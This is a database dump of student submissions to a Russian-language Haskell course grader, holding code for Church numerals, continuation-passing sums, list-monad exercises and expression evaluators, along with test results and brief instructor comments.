(4181, 119, '3742311', '2012-11-26 13:56:55', 0, 'toInt cond = cond (+1) 0\r\n\r\nnewFunc f = ((x, y) -> (f x, x))\r\n\r\ndec func = (f x -> let (_, res) = func (newFunc f) (x, x) in res)', 'Не удалось вычислить выражение "toInt (dec (f x -> f (f (f x))))", проверьте правильность синтаксиса'),
(4182, 119, '3742311', '2012-11-26 14:00:14', 0, 'toInt cond = cond (+1) 0\r\n\r\nnewFunc f = ((x, y) -> ((f x), x))\r\n\r\ndec func = (f x -> let (_, res) = (func (newFunc f) (x, x)) in res)', 'Не удалось вычислить выражение "toInt (dec (f x -> f (f (f x))))", проверьте правильность синтаксиса'),
(4183, 99, '51559263', '2012-11-26 14:07:09', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace Diff\r\n{\r\n    class Expr\r\n    {\r\n        public string e;\r\n    }\r\n\r\n    class N : Expr \r\n    {\r\n        public N ( int n )\r\n        {\r\n            e = "N " + n.ToString();\r\n        }\r\n    }\r\n\r\n    class X : Expr \r\n    {\r\n        public X ()\r\n        {\r\n            e = "X";\r\n        }\r\n    }\r\n    \r\n    class Add : Expr \r\n    {\r\n        public Add (Expr _e1, Expr _e2)\r\n        {\r\n            e1 = _e1; \r\n            e2 = _e2;\r\n\r\n            e = "Add ( " + e1.e + " ) " + "( " + e2.e + " )" ;\r\n        }\r\n\r\n        public Expr e1;\r\n        public Expr e2;\r\n    }\r\n    \r\n    class Mult : Expr \r\n    {\r\n        public Mult (Expr _e1, Expr _e2)\r\n        {\r\n            e1 = _e1; \r\n            e2 = _e2;\r\n\r\n            e = "Mult ( " + e1.e + " ) " + "( " + e2.e + " )";\r\n        }\r\n\r\n        public Expr e1;\r\n        public Expr e2;\r\n    }\r\n\r\n    class Program\r\n    {\r\n        static Expr Diff( Expr e )\r\n        {\r\n            if (e is N)\r\n                return new N(0);\r\n\r\n            else if (e is X)\r\n                return new N(1);\r\n\r\n            else if (e is Add)\r\n                return new Add( Diff((e as Add).e1), Diff((e as Add).e2) );\r\n\r\n            else\r\n                return new Add( new Mult(Diff((e as Mult).e1), (e as Mult).e2), \r\n                                new Mult(Diff((e as Mult).e2), (e as Mult).e1) );\r\n        }\r\n\r\n        static void Main()\r\n        {\r\n            Console.Write( Diff(new Mult ( new X(), new X() )).e );\r\n            Console.ReadKey();\r\n        }\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(4184, 113, '383483', '2012-11-26 14:53:21', 1, 'sum_cps [] f = f 0\r\nsum_cps (x:xs) f = sum_cps xs (	->f (t+x))', '<br/>Тесты успешно пройдены!'),
(4185, 119, '3742311', '2012-11-26 15:01:20', 0, 'toInt cond = cond (+1) 0\r\n\r\ntru = (	 f -> t)\r\nfls = (	 f -> f)\r\n\r\npair f s = ( -> b f s)\r\nfirst = (p -> p tru)\r\nsecond = (p -> p fls)\r\n\r\nnewFunc f = (p -> pair (f (first p)) (first p))\r\n\r\ndec func = (f x -> second (func (newFunc f) (pair x x)))', 'Не удалось вычислить выражение "toInt (dec (f x -> f (f (f x))))", проверьте правильность синтаксиса'),
(4186, 114, '383483', '2012-11-26 15:05:36', 1, 'triangle1 n = [1..n] >>= (	->[x|x<-[1..t]])\r\ntriangle2 n = do x<-[1..n]\r\n		 y<-[1..x]\r\n		 return y', '<br/>Тесты успешно пройдены!'),
(4187, 115, '383483', '2012-11-26 15:23:09', 1, 'f xs = zipWith (+) (find (<5) xs) (zipWith (+) (find (>10) xs) (find (/=7) xs))\r\nfind cond [] = []\r\nfind cond (x:xs) = if cond x then [x] else find cond xs', '<br/>Тесты успешно пройдены!'),
(4188, 119, '3742311', '2012-11-26 16:24:45', 1, 'toInt cond = cond (+1) 0\r\n\r\ntru = (	 f -> t)\r\nfls = (	 f -> f)\r\n\r\npair f s = ( -> b f s)\r\nfirst = (p -> p tru)\r\nsecond = (p -> p fls)\r\n\r\nnewFunc f = (p -> pair (f (first p)) (first p))\r\n\r\ndec func = (f x -> second (func (newFunc f) (pair x x)))', 'Не удалось вычислить выражение "toInt (dec (f x -> f (f (f x))))", проверьте правильность синтаксиса'),
(4189, 114, '3607492', '2012-11-26 16:40:55', 1, 'triangle1 n = ([1..n])>>=(l->[1..l])\r\n\r\ntriangle2 n = do \r\n				result <- [1..n]\r\n				l <- [1..result]\r\n				return l', '<br/>Тесты успешно пройдены!'),
(4190, 120, '44060', '2012-11-26 17:15:19', 2, '  --- Что-то у меня не компилируется - нварное, что-то пропало при выладывании в систему\r\n  --- Например,в isTautology я вижжу let без in\r\n  --- Пришлите мне на почту решение, пожалуйста.\r\ndata Expr = St Char | Impl Expr Expr deriving (Eq)\r\ninstance Show Expr where\r\n	show (St ch) = show ch\r\n	show (Impl e1 e2) = "("++(show e1)++" -> "++(show e2)++")"\r\n\r\nisTautology expr = let f = func expr\r\n\r\nfunc expr = f expr []\r\n	where \r\n		f (Impl expr1 expr2) result = let result1 = f expr1 result in f expr2 result1\r\n		f (St ch) result = if elemIndex ch result /= Nothing then result else (ch:result)\r\nsubstitute (St ch) vars = let (chClone, value) = head (filter ((var, val) -> var == ch) vars) in value\r\nsubstitute (Impl expr1 expr2) vars = let result1 = substitute expr1 vars;\r\n									 result2 = substitute expr2 vars in\r\n									 (not result1) || result2', '<br/>Тесты успешно пройдены!'),
(4191, 120, '3742311', '2012-11-26 17:36:09', 1, 'data ImpExpr = Imp ImpExpr ImpExpr | Var [Char]\r\n\r\nfind _ [] err = err\r\nfind cond (x:xs) err = if cond x then x else find cond xs err\r\n\r\ncanBeTrue _ [] = []\r\ncanBeTrue (Var x) s = let (p, z) = (find ((t, v) -> t == x) s ([], False)) in if p == [] then ((x, True):s) else if z then s else []\r\ncanBeTrue (Imp i1 i2) s = let res1 = canBeFalse i1 s in if res1 == [] then canBeTrue i2 s else res1\r\n\r\ncanBeFalse _ [] = []\r\ncanBeFalse (Var x) s = let (p, z) = (find ((t, v) -> t == x) s ([], False)) in if p == [] then ((x, False):s) else if z then [] else s\r\ncanBeFalse (Imp i1 i2) s = canBeTrue i1 (canBeFalse i2 s)\r\n\r\nisTautology i = canBeFalse i [([], False)] == []\r\n\r\ninstance Show ImpExpr where\r\n  show (Imp i1 i2) = ''('':(show i1) ++ " -> " ++ (show i2) ++ ")"\r\n  show (Var c) = c', '<br/>Тесты успешно пройдены!'),
(4192, 115, '3607492', '2012-11-26 17:42:52', 1, 'find cond [] = []\r\nfind cond (x:xs) = if cond x then [x] else find cond xs\r\n\r\nf x =foldl (x y -> if (y==[]||x==[]) then [] else [x!!0 + y!!0]) [0] $[(>10),(<5),(/=7)]>>=(	 -> return $find t x)', '<br/>Тесты успешно пройдены!'),
(4193, 116, '3607492', '2012-11-26 17:46:40', 1, 'toInt f = f (+1) 0', '<br/>Тесты успешно пройдены!'),
(4194, 117, '3607492', '2012-11-26 17:49:40', 0, 'toInt f = f (+1) 0\r\n\r\ninc f = (	 x -> f t x)', 'Выражение имеет неправильное значение: let c3 f x = f (f x) in toInt (inc c3)'),
(4195, 117, '3607492', '2012-11-26 17:54:16', 1, 'toInt f = f (+1) 0\r\n\r\ninc f = (	 x -> f t (t x))', '<br/>Тесты успешно пройдены!'),
(4196, 111, '472848', '2012-11-26 17:57:26', 1, 'data Expr = Var String | N Integer | Add Expr Expr | Mult Expr Expr\r\n\r\neval (N i) _ = i\r\neval (Var st) ((var, val):li) = if (var == st) then val else eval (Var st) li\r\neval (Add e1 e2) li = (eval e1 li) + (eval e2 li)\r\neval (Mult e1 e2) li = (eval e1 li) * (eval e2 li)', '<br/>Тесты успешно пройдены!'),
(4197, 111, 'tonyo', '2012-11-26 18:13:27', 1, 'data Expr = Var String | N Integer | Add Expr Expr | Mult Expr Expr\r\n  deriving Show\r\n\r\n\r\neval (Var v) vars = snd valuetuple\r\n  where valuetuple = head (filter (	 -> fst t == v) vars)\r\n                                                                                                                                                                                                \r\neval (N i) vars = i \r\neval (Add e1 e2) vars = (eval e1 vars) + (eval e2 vars)\r\neval (Mult e1 e2) vars = (eval e1 vars) * (eval e2 vars)\r\n', '<br/>Тесты успешно пройдены!'),
(4198, 112, 'tonyo', '2012-11-26 18:19:59', 1, 'data Expr = Var String | N Integer | Add Expr Expr | Mult Expr Expr | Let String Integer Expr\r\n  deriving Show\r\n\r\n\r\neval (Var v) vars = snd valuetuple\r\n  where valuetuple = head (filter (	 -> fst t == v) vars)\r\n\r\neval (N i) vars = i                                                                                                                                                                             \r\neval (Add e1 e2) vars = (eval e1 vars) + (eval e2 vars)\r\neval (Mult e1 e2) vars = (eval e1 vars) * (eval e2 vars)\r\neval (Let var value expr) vars = eval expr ((var, value):vars)\r\n', '<br/>Тесты успешно пройдены!'),
(4199, 116, 'tonyo', '2012-11-26 18:49:08', 1, 'toInt chnum = chnum (+1) 0 ', '<br/>Тесты успешно пройдены!'),
(4200, 117, 'tonyo', '2012-11-26 19:01:26', 1, 'toInt chnum = chnum (+1) 0\r\ninc chnum  = f x -> f (chnum f x)\r\n', '<br/>Тесты успешно пройдены!'),
(4201, 107, 'tonyo', '2012-11-26 20:49:04', 1, 'data LogExpr = T | F | X | And LogExpr LogExpr | Or LogExpr LogExpr | Not LogExpr\r\n  deriving Show\r\n\r\n\r\ncomp T y = T\r\ncomp F y = F\r\ncomp X y = y\r\ncomp (Not e) y = s $ Not (comp e y)\r\ncomp (Or e1 e2) y = s $ Or (comp e1 y) (comp e2 y)\r\ncomp (And e1 e2) y = s $ And (comp e1 y) (comp e2 y)\r\n\r\nr (Not T) = F\r\nr (Not F) = T\r\nr (Or T e) = T\r\nr (Or e T) = T\r\nr (Or F e) = e\r\nr (Or e F) = e\r\nr (And e1 e2) = s (Not (Or (Not e1) (Not e2)))\r\n\r\ns X = X\r\ns T = T\r\ns F = F\r\ns (And e1 e2) = r (And (s e1) (s e2))\r\ns (Or e1 e2) = r (Or (s e1) (s e2))\r\ns (Not e) = r (Not (s e))\r\n\r\n\r\ninstance Eq LogExpr where\r\n  T == T = True\r\n  F == F = True\r\n  T == F = False\r\n  F == T = False\r\n  e == f = (et == ft && ef == ff)\r\n    where et = comp e T; ef = comp e F;\r\n          ft = comp f T; ff = comp f F; \r\n', '<br/>Тесты успешно пройдены!'),
(4202, 115, '3431532', '2012-11-27 07:38:48', 1, 'find cond [] = []\r\nfind cond (x:xs) = if cond x then [x] else find cond xs\r\n\r\nf x = let y = ls x \r\n		in if length y == 3 then [foldr (+) 0 y] else []\r\n\r\n\r\nls xs = [x |y <- [(<5), (>10), (/=7)], x<-( find y xs)]\r\n', '<br/>Тесты успешно пройдены!'),
(4203, 113, '3742311', '2012-11-27 07:46:39', 0, 'sum_cps [] f = f 0\r\nsum_cps (h:t) f = sum_cps t (x -> h + f x)', 'Выражение имеет неправильное значение: sum_cps [1,2,3] (^2)'),
(4204, 113, '3742311', '2012-11-27 07:51:27', 1, 'sum_cps [] f = f 0\r\nsum_cps (h:t) f = sum_cps t (x -> f (x + h))', '<br/>Тесты успешно пройдены!'),
(4205, 121, '3742311', '2012-11-27 08:03:54', 1, '<html>\r\n\r\n    <head>\r\n\r\n        <script language=''javascript''>\r\n\r\n            \r\n\r\n            var fact_cps = function(n, f) {\r\n\r\n                if (n == 0) {\r\n\r\n                    return f(1);\r\n\r\n                }\r\n\r\n                \r\n\r\n                var next = function(t) {\r\n\r\n                    return f(t * n);\r\n\r\n                }\r\n\r\n                \r\n\r\n                return fact_cps(n - 1, next);\r\n\r\n            }\r\n\r\n            \r\n\r\n            var main = function() {\r\n\r\n                var n = 4;\r\n\r\n                var f = function(t) {\r\n\r\n                    return t * t;\r\n\r\n                }\r\n\r\n                \r\n\r\n                var res = fact_cps(n, f);\r\n\r\n                \r\n\r\n                alert(res);\r\n\r\n            }\r\n\r\n            \r\n\r\n            main();\r\n\r\n            \r\n\r\n        </script>\r\n\r\n    </head>\r\n\r\n</html>\r\n', '<br/>Тесты успешно пройдены!'),
(4206, 118, '533223', '2012-11-27 08:47:41', 2, '  -- Но второый параметр >>> - это не пара, эт функция, которая возвращает пару\r\nf >>> ( _, b ) = f b', 'Не удалось вычислить выражение "let f = find (>3) >>> find (>3) in f [1, 3, 5, 2, 20, 25, 2]", проверьте правильность синтаксиса'),
(4207, 113, '5656962', '2012-11-27 08:56:59', 1, 'sum_cps [] f = f 0\r\n\r\nsum_cps (x:xs) f = sum_cps xs (	 -> f(t + x))\r\n', '<br/>Тесты успешно пройдены!'),
(4208, 114, '5656962', '2012-11-27 08:58:43', 1, 'triangle1 n = [1..n] >>= x -> [1..x] >>= y -> return y\r\n\r\n\r\n\r\ntriangle2 n =  do \r\n\r\n				x <- [1..n] \r\n\r\n				y <- [1..x]\r\n\r\n				return y\r\n', '<br/>Тесты успешно пройдены!'),
(4209, 113, '3431532', '2012-11-27 09:07:52', 1, 'sum_cps [] k = k 0\r\nsum_cps (x : xs) k = sum_cps xs (k . (+x))', '<br/>Тесты успешно пройдены!'),
(4210, 119, '3607492', '2012-11-27 11:07:59', 2, '  --- Нет, это не по условию.. Это как рез то, что я имел в виду, когда писал\r\n  --- "нельзя перевести число Черча в обычное, вычесть 1 и перевести обратно."\r\ntoInt f = f (+1) 0\r\n\r\ninc f =(	 x -> f t (t x))\r\n\r\nchear 1 _ x = x\r\nchear n f x = f (chear (n-1) f x)\r\n\r\ndec f =(	 x -> chear (toInt f) t x)', '<br/>Тесты успешно пройдены!'),
(4211, 112, '97440347', '2012-11-27 12:34:00', 0, 'data Expr = Let String Integer Expr|Var String|X|N Integer|Add Expr Expr|Mult Expr Expr deriving Show\r\nsimplify2 (Mult x (N 0)) = (N 0)\r\nsimplify2 (Mult (N 0) x) = (N 0)\r\nsimplify2 (Mult x y) = (Mult x y)\r\nsimplify (Mult x (N 0)) = (N 0)\r\nsimplify (Mult (N 0) x) = (N 0)\r\nsimplify (Mult x y) = simplify2 (Mult (simplify x) (simplify y))\r\nsimplify (Add x y) = Add (simplify x) (simplify y)\r\nsimplify (N i) = (N i)\r\nsimplify x = x\r\neval (Let v_symb val x) (c:cs) = eval x ((c:cs)++[(v_symb,val)])\r\neval (Var v_symb) [] = 0\r\neval (Var v_symb) (c:cs) = if (fst c == v_symb)\r\n						  then (snd c)\r\n		                  else (eval (Var v_symb) cs)\r\neval (N i) n = i\r\neval (Mult x y) n = (eval x n)*(eval y n)\r\neval (Add x y) n = (eval x n) + (eval y n)', 'Выражение имеет неправильное значение: eval (Let [''x''] 10 (Mult (Var [''x'']) (Var [''y'']))) [([''x''], 0),([''y''], 2)]'),
(4212, 112, '97440347', '2012-11-27 12:36:46', 1, 'data Expr = Let String Integer Expr|Var String|X|N Integer|Add Expr Expr|Mult Expr Expr deriving Show\r\nsimplify2 (Mult x (N 0)) = (N 0)\r\nsimplify2 (Mult (N 0) x) = (N 0)\r\nsimplify2 (Mult x y) = (Mult x y)\r\nsimplify (Mult x (N 0)) = (N 0)\r\nsimplify (Mult (N 0) x) = (N 0)\r\nsimplify (Mult x y) = simplify2 (Mult (simplify x) (simplify y))\r\nsimplify (Add x y) = Add (simplify x) (simplify y)\r\nsimplify (N i) = (N i)\r\nsimplify x = x\r\neval (Var v_symb) [] = 0\r\neval (Var v_symb) (c:cs) = if (fst c == v_symb)\r\n						  then (snd c)\r\n		                  else (eval (Var v_symb) cs)\r\neval (N i) n = i\r\neval (Mult x y) n = (eval x n)*(eval y n)\r\neval (Add x y) n = (eval x n) + (eval y n)\r\neval (Let v_symb val x) (c:cs) = eval x ((v_symb,val):c:cs)', '<br/>Тесты успешно пройдены!'),
(4213, 113, '318210', '2012-11-27 12:58:04', 1, 'sum_cps [] f = f 0\r\nsum_cps (x:xs) f = sum_cps xs (	 -> f (x + t)) ', '<br/>Тесты успешно пройдены!'),
(4214, 117, '97440347', '2012-11-27 13:38:10', 1, 'toInt n = n (x -> x + 1) 0\r\ninc n = f -> x -> f (n f x)', '<br/>Тесты успешно пройдены!'),
(4215, 118, '3607492', '2012-11-27 15:03:55', 1, '(>>>)::([a]->(a,[a]))->([a]->(a,[a]))->[a]->(a,[a])\r\n(>>>) f1 f2 x = f2 (snd (f1 x))\r\n\r\nfind cond (x:xs) = if cond x then (x, xs) else find cond xs', '<br/>Тесты успешно пройдены!'),
(4216, 116, '383483', '2012-11-27 16:20:46', 1, 'toInt ff = ff (+1) 0', '<br/>Тесты успешно пройдены!'),
(4217, 117, '383483', '2012-11-27 16:25:04', 1, 'toInt ff = ff (+1) 0\r\ninc ff = (f x -> f (ff f x))', '<br/>Тесты успешно пройдены!'),
(4218, 114, '3431532', '2012-11-27 16:53:47', 2, '--- Это же не по условию - triangle1 надо обязательно написать с помощью >>=\r\n--- (Это очень просто, на самом деле - проще, чем ваш вариант)\r\ntriangle1 x = concat (take x triangleF )\r\n\r\ntriangleF = [[]] ++ triangleF >>= x -> [x ++ [((ls x) + 1)]]\r\n\r\nls [] = 0\r\nls x = last x\r\n\r\ntriangle2 x = concat (take x triangleS)\r\n\r\ntriangleS = [1] :    do { x<-triangleS;\r\n		 	  [x++[(last x) + 1]]}', '<br/>Тесты успешно пройдены!'),
(4219, 112, '3431532', '2012-11-27 17:19:17', 1, 'data Expr = N Integer | Let String Integer Expr | Var String\r\n           | Mult Expr Expr\r\n           | Add  Expr Expr deriving Show\r\n\r\n\r\neval x y = evall ( repl x y)\r\n\r\nevall (N x) = x\r\nevall (Add x y)  =  (evall x) + (evall y)\r\nevall (Mult x y) = (evall x) * (evall y)\r\n\r\n\r\n\r\nrepl (Var x) ls = getVl x ls \r\nrepl (N x) ls = N x\r\nrepl (Add x y) ls =  Add (repl x ls) (repl y ls)\r\nrepl (Mult x y) ls = Mult (repl x ls) (repl y ls)\r\nrepl (Let x y exp) ls = repl exp ((x,y):ls)\r\n\r\ngetVl x [] = N 0\r\ngetVl x ((ex, val):xs) | ex == x = N val\r\ngetVl x (y:ys) = getVl x ys ', '<br/>Тесты успешно пройдены!'),
(4220, 113, '787463', '2012-11-27 17:23:21', 1, 'sum_cps [] f = f 0\r\nsum_cps (x:xs) f = f (sum_cps xs (+x))', '<br/>Тесты успешно пройдены!'),
(4221, 118, '3431532', '2012-11-27 17:36:42', 1, 'find cond (x:xs) = if cond x then (x, xs) else find cond xs\r\n\r\nf >>> g = 	 -> g (snd (f t))\r\n\r\nf = find (>3) >>> find (>3) ', '<br/>Тесты успешно пройдены!'),
(4222, 106, '6774563', '2012-11-27 17:38:18', 1, '-- Так и не смог сам прудумать алгоритм, однако, оказывается, был близок :(\r\n-- Так что идея и интернета\r\n\r\nfindMajor xs = let\r\n	boolToInt b = if b then 1 else 0\r\n	treshold = (length xs + 1) `div` 2\r\n	processElement x (candidate, balance) 	| x == candidate	= (candidate, balance + 1)\r\n						| balance == 0		= (x, 1)\r\n						| otherwise		= (candidate, balance - 1)\r\n	candidatePair = foldr (processElement) (0,0) xs\r\n	candidate = fst candidatePair\r\n	balance = snd candidatePair\r\n	checkCandidate x = (foldr (x c -> c + (boolToInt (x == candidate))) 0 xs) >= treshold\r\n		in if (balance > 0 && checkCandidate candidate) then Just candidate else Nothing\r\n', '<br/>Тесты успешно пройдены!'),
(4223, 108, '6774563', '2012-11-27 17:39:38', 1, '--module Main where\r\n\r\n\r\n\r\n-- Вертикали - условие автоматом (по ним расставляем)\r\n\r\n-- Горизонтали - [1..n] - представление множества в виде функции\r\n\r\n-- Диагонали - [2..n+k] и [1-m..m-1] - сумма координат однакова (m = max(n,k))\r\n\r\n-- Можно считать, что max(n,k) = n, в противном случае ответ пуст (валидируем вначале).\r\n\r\n-- Таким образом, диагонали - [2..n+k] и [1-n..n-1], но, понятно, нам все равно,\r\n\r\n-- из-за представления лямбдой\r\n\r\n\r\n\r\nqueens n k | n < k = []\r\n\r\nqueens n k | otherwise = let\r\n\r\n	-- вначале ничего не занято, т.е. все свободно\r\n\r\n	result = queens'' n k (const True) (const True) (const True) [] []\r\n\r\n		in map (zip [1..k]) result\r\n\r\n\r\n\r\n-- x - вертикаль, просто каждый раз инкрементируем\r\n\r\n-- y - горизонталь, которую каждый раз перебираем \r\n\r\nqueens'' _ x _ _ _ acc cur | x == 0 = cur:acc\r\n\r\nqueens'' n x h d1 d2 acc cur = let\r\n\r\n	canPlace y = h y && d1 (x+y) && d2 (x-y)\r\n\r\n	newH y = z -> h z && z /= y\r\n\r\n	newD1 y = z -> d1 z && z /= x + y\r\n\r\n	newD2 y = z -> d2 z && z /= x - y\r\n\r\n	-- "размещаем" ферзь на поле\r\n\r\n	place acc y = if (canPlace y) then queens'' n (x-1) (newH y) (newD1 y) (newD2 y) acc (y:cur) else acc\r\n\r\n		in foldl (place) acc [1..n]\r\n\r\n\r\n\r\n--main = putStrLn $ show $ queens 4 4\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(4224, 111, '6774563', '2012-11-27 18:04:11', 1, 'import Data.List\r\n\r\ndata Expr = N Int | Var String | Add Expr Expr | Mult Expr Expr\r\n\r\neval (N n) _ = n\r\neval (Var s) values = let\r\n	value = find (v -> fst v == s) values\r\n	getValue (Just x) = snd x\r\n	getValue Nothing = 0 -- error "Undefined value of " ++ s\r\n		in getValue value\r\neval (Add e1 e2) values = eval e1 values + eval e2 values\r\neval (Mult e1 e2) values = eval e1 values * eval e2 values\r\n', '<br/>Тесты успешно пройдены!'),
(4225, 112, '6774563', '2012-11-27 18:21:44', 1, '-- Здесь могут быть, видимо, 2 типа конфликтов:\r\n-- 1. Let + Let - определено два Let`а, один внутри другого.\r\n-- 	В этом случае я буду использовать тот, который "ближе" (так, видимо, логичнее).\r\n-- 2. Окружение + Let (понятно как). Использую значение под Let, из тех же соображений.\r\n\r\nimport Data.List\r\n\r\ndata Expr = N Int | Var String | Add Expr Expr | Mult Expr Expr | Let String Int Expr\r\n\r\neval (N n) _ = n\r\neval (Var s) values = let\r\n	value = find (v -> fst v == s) values\r\n	getValue (Just x) = snd x\r\n	getValue Nothing = 0 -- error "Undefined value of " ++ s\r\n		in getValue value\r\neval (Add e1 e2) values = eval e1 values + eval e2 values\r\neval (Mult e1 e2) values = eval e1 values * eval e2 values\r\neval (Let s v e) values = let\r\n	newEnviroment = (s,v):(filter (x -> fst x /= s) values)\r\n		in eval e newEnviroment\r\n', '<br/>Тесты успешно пройдены!'),
(4226, 113, '6774563', '2012-11-27 18:39:23', 2, '  --- Нет, это не совсем по условию. Формально требования выполнены, но это не continuation passing style,\r\n  --- тем не менее. Попробуйте исправить, пожалуйста.\r\n  --- Подсказка: как накапливающий параметр должен использоваться параметр cp и в нем копиться _функция_\r\nsum_cps [] cp = cp 0\r\nsum_cps [x] cp = cp x\r\nsum_cps (x:x'':xs) cp = sum_cps ((x+x''):xs) cp\r\n', '<br/>Тесты успешно пройдены!'),
(4227, 114, '6774563', '2012-11-27 18:51:56', 1, '-- Что-то не очень понятно, куда тут return впихнуть\r\n-- Хотя, наверное, так каждый Вам написал :)\r\ntriangle1 n = [1..n] >>= x -> [1..x]\r\n  --- Да вовсе нет, только вы:) Большинство просто проигнорировали это условие :) \r\n  --- Но многие и впихнули, точно также, как в triangle2:\r\n  ---    triangle1 n = [1..n] >>= x -> [1..x] >>= x'' -> return x''\r\n\r\n-- Скорее сюда, ведь\r\ntriangle2 n = do\r\n	x <- [1..n]\r\n	x'' <- [1..x]\r\n	return x''', '<br/>Тесты успешно пройдены!'),
(4228, 115, '6774563', '2012-11-27 18:58:24', 1, 'find cond [] = []\r\nfind cond (x:xs) = if cond x then [x] else find cond xs\r\n\r\nf xs = zipWith3 (a b c -> a+b+c) (find (<5) xs) (find (>10) xs) (find (/=7) xs)\r\n', '<br/>Тесты успешно пройдены!'),
(4229, 116, '6774563', '2012-11-27 19:05:50', 1, '-- Очень надеюсь, что я правильно понял, что такое число Черча\r\n   --- Да, все правильно..\r\ntoInt fx = fx (+1) 0\r\n', '<br/>Тесты успешно пройдены!'),
(4230, 117, '6774563', '2012-11-27 19:11:49', 1, 'toInt fx = fx (+1) 0\r\n\r\ninc fx = f x -> f (fx f x)\r\n', '<br/>Тесты успешно пройдены!'),
(4231, 114, '533223', '2012-11-27 19:17:36', 1, 'triangle1 n = do \r\n		x <- [1..n]\r\n		y <- [1..x]\r\n		[y]\r\n\r\n\r\ntriangle2 n = [1..n] >>= ( x -> [1..x] >>= ( y -> [y] ))', '<br/>Тесты успешно пройдены!'),
(4232, 118, '6774563', '2012-11-27 19:26:32', 1, 'find cond (x:xs) = if cond x then (x, xs) else find cond xs\r\n\r\n-- надеюсь, что сначала должна быть вызвана f, а затем f'' для ее остатка\r\n-- для композиции просто наоборот, и это путает\r\n-- на крайний случай можно поменять f и f''\r\n   --- Ну да, в данном случае мне показалочь что удобнее сделать не так, как в композиции,\r\n   --- так наглядно соотвествует движению по списку слева направо.\r\nf >>> f'' = f''.snd.f\r\n\r\nf = find (>3) >>> find (>3) \r\n', '<br/>Тесты успешно пройдены!'),
(4233, 115, '533223', '2012-11-27 19:28:57', 1, 'find cond [] = []\r\nfind cond (x:xs) = if cond x then [x] else find cond xs\r\n\r\nf xs =  let \r\n		f5 = find (<5) xs\r\n		f10 = find (>10) xs\r\n		f7 = find (/=7) xs\r\n	in\r\n		if( f5/=[] && f10/=[] && f7/=[] )\r\n			then [ (head f5) + (head f10) + (head f7) ]\r\n		else\r\n			[]', '<br/>Тесты успешно пройдены!'),
(4234, 111, '4837959', '2012-11-27 19:39:01', 2, '--- Вы случайно выложили пустое решение? \r\n--- Если вы раньше выкладывали правильное решение, выложите его снова, пожалуйста\r\n--- иначе оно будет не засчитано.', 'Не удалось вычислить выражение "eval (Add (Var [''x'']) (Mult (Var [''y'']) (N 3))) [([''x''], 5), ([''y''], 8)]", проверьте правильность синтаксиса'),
(4235, 111, '419046', '2012-11-27 19:41:02', 1, 'data Expr = Var String | N Integer | Add Expr Expr | Mult Expr Expr deriving Show\r\n\r\n  \r\n\r\neval (Var v) (x:xs) = if (v==fst(x)) then snd(x) else (eval (Var v) xs)\r\n\r\n\r\n\r\neval (N i) xs = i\r\n\r\n\r\n\r\neval (Add e1 e2) xs = (eval e1 xs) + (eval e2 xs)\r\n\r\n\r\n\r\neval (Mult e1 e2) xs = (eval e1 xs) * (eval e2 xs) \r\n\r\n \r\n', '<br/>Тесты успешно пройдены!'),
(4236, 116, '318210', '2012-11-27 19:49:10', 1, 'toInt churchN = churchN (+1) 0', '<br/>Тесты успешно пройдены!'),
(4237, 117, '318210', '2012-11-27 20:00:04', 1, 'toInt churchN = churchN (+1) 0\r\ninc churchN = ( f x -> f(churchN f x))', '<br/>Тесты успешно пройдены!'),
(4238, 113, '4837959', '2012-11-27 20:15:47', 1, 'sum_cps [] f = f 0\r\n\r\nsum_cps (x:xs) f = sum_cps xs (	 -> f (t + x))\r\n\r\n\r\n\r\ntest = sum_cps [1,2,3] id\r\n\r\ntest2 = sum_cps [1,2,3] (^2)\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(4239, 113, '419046', '2012-11-27 20:23:22', 1, 'sum_cps [] f = f 0\r\n\r\nsum_cps (x:xs) f = sum_cps xs (f.(+ x))\r\n', '<br/>Тесты успешно пройдены!'),
(4240, 113, 'tonyo', '2012-11-27 20:28:15', 1, 'sum_cps [] f = f 0\r\nsum_cps (x:xs) f = sum_cps xs (	 -> f(t + x))   ', '<br/>Тесты успешно пройдены!'),
(4241, 114, '442421', '2012-11-27 20:40:39', 0, '--triangle1 n = [1..n]>>=(x->[1..x])\r\ntriangle1 n = [1..n]>>=(x->return [1..x])\r\n\r\ntriangle2 n = [1..n]>>=(x->return [1..x])\r\n\r\n--triangle2 n = do \r\n--		x<-[1..n] \r\n--	      return [1..x]', 'Выражение имеет неправильное значение: triangle1 3'),
(4242, 114, '442421', '2012-11-27 20:41:20', 0, 'triangle1 n = [1..n]>>=(x->[1..x])\r\n--triangle1 n = [1..n]>>=(x->return [1..x])\r\n\r\ntriangle2 n = [1..n]>>=(x->[1..x])\r\n\r\n--triangle2 n = do \r\n--		x<-[1..n] \r\n--	      return [1..x]', '<br/>Тесты успешно пройдены!'),
(4243, 114, 'tonyo', '2012-11-27 20:46:02', 1, 'triangle1 n = [1..n] >>= x ->\r\n                [1..x] >>= y ->\r\n                  return y\r\n\r\ntriangle2 n = do\r\n              x <- [1..n]\r\n              y <- [1..x]\r\n              [y]\r\n', '<br/>Тесты успешно пройдены!'),
(4244, 118, '355679', '2012-11-27 20:50:52', 1, 'find cond (x:xs) = if cond x then (x, xs) else find cond xs\r\n\r\n\r\n\r\nf1 >>> f2 = f1 . snd . f2\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(4245, 113, '442421', '2012-11-27 20:53:07', 0, '\r\n--не очень понятно как сделать triangle1 c return\r\n\r\ntriangle1 n = [1..n]>>=(x->[1..x])\r\n--triangle1 n = concat ([1..n]>>=(x->return [1..x]))\r\n\r\n\r\ntriangle2 n = do \r\n		x<-[1..n]\r\n		[1..x]', 'Не удалось вычислить выражение "sum_cps [1,2,3] (^2)", проверьте правильность синтаксиса'),
(4246, 114, '442421', '2012-11-27 20:53:33', 1, '--не очень понятно как сделать triangle1 c return\r\n  --- Как-то так: triangle1 n = [1..n]>>=(x->[1..x] >>= y -> return y)\r\n\r\ntriangle1 n = [1..n]>>=(x->[1..x])\r\n--triangle1 n = concat ([1..n]>>=(x->return [1..x]))\r\n\r\n\r\ntriangle2 n = do \r\n		x<-[1..n]\r\n		[1..x]', '<br/>Тесты успешно пройдены!'),
(4247, 113, '442421', '2012-11-27 21:14:12', 0, 'sum_cps [] f = f 0\r\nsum_cps (x:xs) f = sum_cps xs ((f.+x))', 'Не удалось вычислить выражение "sum_cps [1,2,3] (^2)", проверьте правильность синтаксиса'),
